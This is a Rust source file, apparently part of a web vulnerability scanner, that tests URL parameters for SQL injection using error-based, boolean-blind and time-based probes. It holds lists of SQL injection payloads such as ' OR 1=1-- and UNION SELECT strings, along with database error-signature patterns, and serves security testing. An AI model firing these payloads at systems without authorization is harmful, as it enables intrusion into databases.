use crate::http::HttpClient;
use crate::types::{Finding, Mode, Severity};
use crate::engine::timing;
use anyhow::Result;
use std::time::Instant;

/// SQLi scanner — error-based + boolean-blind + time-based blind detection.
pub async fn scan(http: &HttpClient, target: &str, params: &[String], mode: Mode) -> Result<Vec<Finding>> {
    let mut out = Vec::new();
    let base = normalize(target);

    let error_payloads = [
        "'", "\"", "')", "'))", "1'", "1\"", " OR '1'='1", " OR 1=1--", " UNION SELECT NULL--",
    ];
    let bool_true = ["1 OR 1=1", "1' OR '1'='1", "1) OR (1=1"];
    let bool_false = ["1 AND 1=2", "1' AND '1'='2", "1) AND (1=2"];

    for p in params {
        // error-based
        for pl in error_payloads.iter().take(if mode == Mode::Crazy { error_payloads.len() } else { 4 }) {
            let u = inject(&base, p, pl);
            if let Ok((_st, _h, body, _f)) = http.get(&u).await {
                if looks_like_sql_error(&body) {
                    out.push(
                        Finding::new(Severity::High, "SQLi", "SQL error leaked (error-based injection)", target)
                            .with_param(p)
                            .with_payload(pl)
                            .with_evidence("DB error string in response")
                            .with_confidence(90),
                    );
                }
            }
        }
        // boolean-blind
        if mode.attempt_bypass() {
            let ut = inject(&base, p, bool_true[0]);
            let uf = inject(&base, p, bool_false[0]);
            if let (Ok((_, _, bt, _)), Ok((_, _, bf, _))) = (http.get(&ut).await, http.get(&uf).await) {
                // crude diff: length + keyword presence
                if bt.len().abs_diff(bf.len()) > 30 && !bt.is_empty() && !bf.is_empty() {
                    out.push(
                        Finding::new(Severity::Medium, "SQLi", "Boolean-blind difference detected", target)
                            .with_param(p)
                            .with_payload(bool_true[0])
                            .with_evidence(&format!("true-len={} false-len={}", bt.len(), bf.len()))
                            .with_confidence(65),
                    );
                }
            }
        }
    }

    // Time-based blind SQLi (hanya di crazy mode — karena butuh waktu)
    // v3.3.0 FIX: 10 samples + statistical delay check (anti-FP from network jitter)
    if mode == Mode::Crazy {
        let sleep_secs = 3;
        let baseline_samples = 10;  // was 3 — too sensitive to network jitter
        let probe_samples = 5;
        let payloads = timing::sql_sleep_payloads(sleep_secs);

        // Baseline timing
        let mut baseline_times = Vec::new();
        let base_url = normalize(target);
        for _ in 0..baseline_samples {
            let start = Instant::now();
            if let Ok(_) = http.get(&base_url).await {
                baseline_times.push(start.elapsed());
            }
        }

        for p in params {
            for pl in &payloads {
                let u = inject(&base, p, pl);
                let mut probe_times = Vec::new();
                for _ in 0..probe_samples {
                    let start = Instant::now();
                    if let Ok(_) = http.get(&u).await {
                        probe_times.push(start.elapsed());
                    }
                }
                if !baseline_times.is_empty() && !probe_times.is_empty() {
                    // Anti-FP: require (1) probe p90 > 2x baseline p90, AND (2) absolute delay > 2s
                    if timing::is_delayed_strong(&baseline_times, &probe_times) {
                        out.push(
                            Finding::new(Severity::High, "SQLi", "Time-based blind SQL injection detected", target)
                                .with_param(p)
                                .with_payload(pl)
                                .with_evidence(&format!("baseline={:?} probe={:?}", baseline_times, probe_times))
                                .with_confidence(85),
                        );
                    }
                }
            }
        }
    }

    Ok(out)
}

fn looks_like_sql_error(b: &str) -> bool {
    let sigs = [
        "sql syntax", "mysql", "postgresql", "sqlite_error", "ora-", "microsoft sql",
        "unclosed quotation", "you have an error", "warning: pg_", "sqlstate",
    ];
    let lb = b.to_lowercase();
    sigs.iter().any(|s| lb.contains(s))
}

fn normalize(t: &str) -> String {
    if t.contains('?') { t.to_string() } else { format!("{}/?id=1", t.trim_end_matches('/')) }
}

fn inject(base: &str, key: &str, val: &str) -> String {
    if let Ok(mut u) = url::Url::parse(base) {
        u.query_pairs_mut().append_pair(key, val);
        u.to_string()
    } else {
        format!("{}?{}={}", base, key, val)
    }
}
